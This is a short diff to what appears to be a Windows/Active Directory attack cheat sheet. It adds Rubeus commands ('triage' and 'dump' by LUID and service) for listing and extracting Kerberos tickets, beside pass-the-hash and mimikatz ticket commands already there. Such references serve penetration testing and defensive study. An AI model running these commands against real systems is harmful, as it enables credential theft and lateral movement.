@@ -1475,6 +1475,7 @@ $ xfreerdp  /v:<IP address> /u:<username> /pth:<hash>
 ```
 C:\> klist
 C>\> Rubeus.exe klist
+PS C:\> Rubeus.exe triage
 mimikatz # kerberos::list
 ```
 
@@ -1510,6 +1511,7 @@ C:\> dir *.kirb
 
 ```
 C:\> Rubeus.exe dump /nowrap
+PS C:\> Rubeus.exe dump /luid:<luid> /service:<service>
 ```
 
 - Mimikatz Pass-The-Ticket (PTT)
